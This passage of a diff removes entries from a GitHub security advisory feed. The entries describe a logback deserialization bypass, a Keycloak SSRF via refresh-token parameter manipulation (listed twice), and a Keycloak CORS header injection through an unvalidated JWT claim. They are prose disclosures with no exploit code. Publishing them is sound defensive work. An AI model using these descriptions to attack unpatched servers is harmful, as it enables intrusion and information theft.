-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-12-01T20:44:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[ch.qos.logback:logback-core] Logback vulnerable to Object Injection through HardenedObjectInputStream modules]]></title>
-        <id>https://github.com/advisories/GHSA-jhq6-gfmj-v8fx</id>
-        <link href="https://github.com/advisories/GHSA-jhq6-gfmj-v8fx"/>
-        <updated>2026-07-15T21:52:55.000Z</updated>
-        <content type="html"><![CDATA[<p>Deserialization of untrusted data vulnerability in QOS.CH Sarl logback logback-core (HardenedObjectInputStream (logback-core) modules) allows Object Injection, albeit heavily restricted.</p>
-<p>More precisely, an attacker able to influence serialized data sent to SimpleSocketServer or SimpleSSLSocketServer can instantiate Proxy objects.</p>
-<p>Although deserialization is heavily restricted by HardenedObjectInputStream and no practical way to achieve remote code execution or significant privilege  escalation has been identified, this issue constitutes a bypass of the  intended security restrictions.</p>
-<p>This issue affects logback: through 1.5.33 inclusive.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10532">https://nvd.nist.gov/vuln/detail/CVE-2026-10532</a></li>
-<li><a href="https://logback.qos.ch/news.html#1.5.34">https://logback.qos.ch/news.html#1.5.34</a></li>
-<li><a href="https://github.com/qos-ch/logback/releases/tag/v_1.5.34">https://github.com/qos-ch/logback/releases/tag/v_1.5.34</a></li>
-<li><a href="https://github.com/advisories/GHSA-jhq6-gfmj-v8fx">https://github.com/advisories/GHSA-jhq6-gfmj-v8fx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jhq6-gfmj-v8fx</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-06-01T15:30:40.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[org.keycloak:keycloak-services] Keycloak Server-Side Request Forgery via OIDC token endpoint manipulation]]></title>
-        <id>https://github.com/advisories/GHSA-22rm-wp4x-v5cx</id>
-        <link href="https://github.com/advisories/GHSA-22rm-wp4x-v5cx"/>
-        <updated>2026-07-15T20:11:34.000Z</updated>
-        <content type="html"><![CDATA[<p>A flaw was found in Keycloak. An authenticated attacker can perform Server-Side Request Forgery (SSRF) by manipulating the <code>client_session_host</code> parameter during refresh token requests. This occurs when a Keycloak client is configured to use the <code>backchannel.logout.url</code> with the <code>application.session.host</code> placeholder. Successful exploitation allows the attacker to make HTTP requests from the Keycloak server’s network context, potentially probing internal networks or internal APIs, leading to information disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4874">https://nvd.nist.gov/vuln/detail/CVE-2026-4874</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-4874">https://access.redhat.com/security/cve/CVE-2026-4874</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2451611">https://bugzilla.redhat.com/show_bug.cgi?id=2451611</a></li>
-<li><a href="https://github.com/keycloak/keycloak/issues/47935">https://github.com/keycloak/keycloak/issues/47935</a></li>
-<li><a href="https://github.com/keycloak/keycloak/pull/49682">https://github.com/keycloak/keycloak/pull/49682</a></li>
-<li><a href="https://github.com/keycloak/keycloak/pull/49685">https://github.com/keycloak/keycloak/pull/49685</a></li>
-<li><a href="https://github.com/keycloak/keycloak/commit/00dd0dd716c4319d3bac3eb2f2ac22d2a94f79fd">https://github.com/keycloak/keycloak/commit/00dd0dd716c4319d3bac3eb2f2ac22d2a94f79fd</a></li>
-<li><a href="https://github.com/keycloak/keycloak/commit/63de0efd351a7a684212a042a12271908f63f0ee">https://github.com/keycloak/keycloak/commit/63de0efd351a7a684212a042a12271908f63f0ee</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:25097">https://access.redhat.com/errata/RHSA-2026:25097</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:25098">https://access.redhat.com/errata/RHSA-2026:25098</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:30049">https://access.redhat.com/errata/RHSA-2026:30049</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:30050">https://access.redhat.com/errata/RHSA-2026:30050</a></li>
-<li><a href="https://github.com/advisories/GHSA-22rm-wp4x-v5cx">https://github.com/advisories/GHSA-22rm-wp4x-v5cx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-22rm-wp4x-v5cx</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-03-26T09:30:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[org.keycloak:keycloak-services] Keycloak Server-Side Request Forgery via OIDC token endpoint manipulation]]></title>
-        <id>https://github.com/advisories/GHSA-22rm-wp4x-v5cx</id>
-        <link href="https://github.com/advisories/GHSA-22rm-wp4x-v5cx"/>
-        <updated>2026-07-15T20:11:34.000Z</updated>
-        <content type="html"><![CDATA[<p>A flaw was found in Keycloak. An authenticated attacker can perform Server-Side Request Forgery (SSRF) by manipulating the <code>client_session_host</code> parameter during refresh token requests. This occurs when a Keycloak client is configured to use the <code>backchannel.logout.url</code> with the <code>application.session.host</code> placeholder. Successful exploitation allows the attacker to make HTTP requests from the Keycloak server’s network context, potentially probing internal networks or internal APIs, leading to information disclosure.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4874">https://nvd.nist.gov/vuln/detail/CVE-2026-4874</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-4874">https://access.redhat.com/security/cve/CVE-2026-4874</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2451611">https://bugzilla.redhat.com/show_bug.cgi?id=2451611</a></li>
-<li><a href="https://github.com/keycloak/keycloak/issues/47935">https://github.com/keycloak/keycloak/issues/47935</a></li>
-<li><a href="https://github.com/keycloak/keycloak/pull/49682">https://github.com/keycloak/keycloak/pull/49682</a></li>
-<li><a href="https://github.com/keycloak/keycloak/pull/49685">https://github.com/keycloak/keycloak/pull/49685</a></li>
-<li><a href="https://github.com/keycloak/keycloak/commit/00dd0dd716c4319d3bac3eb2f2ac22d2a94f79fd">https://github.com/keycloak/keycloak/commit/00dd0dd716c4319d3bac3eb2f2ac22d2a94f79fd</a></li>
-<li><a href="https://github.com/keycloak/keycloak/commit/63de0efd351a7a684212a042a12271908f63f0ee">https://github.com/keycloak/keycloak/commit/63de0efd351a7a684212a042a12271908f63f0ee</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:25097">https://access.redhat.com/errata/RHSA-2026:25097</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:25098">https://access.redhat.com/errata/RHSA-2026:25098</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:30049">https://access.redhat.com/errata/RHSA-2026:30049</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:30050">https://access.redhat.com/errata/RHSA-2026:30050</a></li>
-<li><a href="https://github.com/advisories/GHSA-22rm-wp4x-v5cx">https://github.com/advisories/GHSA-22rm-wp4x-v5cx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-22rm-wp4x-v5cx</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-03-26T09:30:28.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[org.keycloak:keycloak-services] Keycloak vulnerable to information disclosure via CORS header injection due to unvalidated JWT azp claim]]></title>
-        <id>https://github.com/advisories/GHSA-5v8v-xvjv-57x7</id>
-        <link href="https://github.com/advisories/GHSA-5v8v-xvjv-57x7"/>
-        <updated>2026-07-15T18:38:10.000Z</updated>
-        <content type="html"><![CDATA[<p>A flaw was found in Keycloak. A remote attacker can exploit a Cross-Origin Resource Sharing (CORS) header injection vulnerability in Keycloak's User-Managed Access (UMA) token endpoint. This flaw occurs because the <code>azp</code> claim from a client-supplied JSON Web Token (JWT) is used to set the <code>Access-Control-Allow-Origin</code> header before the JWT signature is validated. When a specially crafted JWT with an attacker-controlled <code>azp</code> value is processed, this value is reflected as the CORS origin, even if the grant is later rejected. This can lead to the exposure of low-sensitivity information from authorization server error responses, weakening origin isolation, but only when a target client is misconfigured with <code>webOrigins: ["*"]</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-37977">https://nvd.nist.gov/vuln/detail/CVE-2026-37977</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-37977">https://access.redhat.com/security/cve/CVE-2026-37977</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2455324">https://bugzilla.redhat.com/show_bug.cgi?id=2455324</a></li>
-<li><a href="https://github.com/keycloak/keycloak/issues/48036">https://github.com/keycloak/keycloak/issues/48036</a></li>
-<li><a href="https://github.com/keycloak/keycloak/pull/49512">https://github.com/keycloak/keycloak/pull/49512</a></li>
-<li><a href="https://github.com/keycloak/keycloak/commit/1439bd58a9f25b0d28d0400015f49f35f227ce04">https://github.com/keycloak/keycloak/commit/1439bd58a9f25b0d28d0400015f49f35f227ce04</a></li>
-<li><a href="https://github.com/keycloak/keycloak/commit/461ce79a6cd6bfef7ca7fa41da287a3127f47ae4">https://github.com/keycloak/keycloak/commit/461ce79a6cd6bfef7ca7fa41da287a3127f47ae4</a></li>
-<li><a href="https://github.com/keycloak/keycloak/commit/ad34724a5d1ba8b6edf7a2c8c83826b1c20539e7">https://github.com/keycloak/keycloak/commit/ad34724a5d1ba8b6edf7a2c8c83826b1c20539e7</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:25097">https://access.redhat.com/errata/RHSA-2026:25097</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:25098">https://access.redhat.com/errata/RHSA-2026:25098</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:30049">https://access.redhat.com/errata/RHSA-2026:30049</a></li>
-<li><a href="https://access.redhat.com/errata/RHSA-2026:30050">https://access.redhat.com/errata/RHSA-2026:30050</a></li>
-<li><a href="https://github.com/advisories/GHSA-5v8v-xvjv-57x7">https://github.com/advisories/GHSA-5v8v-xvjv-57x7</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5v8v-xvjv-57x7</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-04-06T09:31:42.000Z</published>
     </entry>
 </feed>
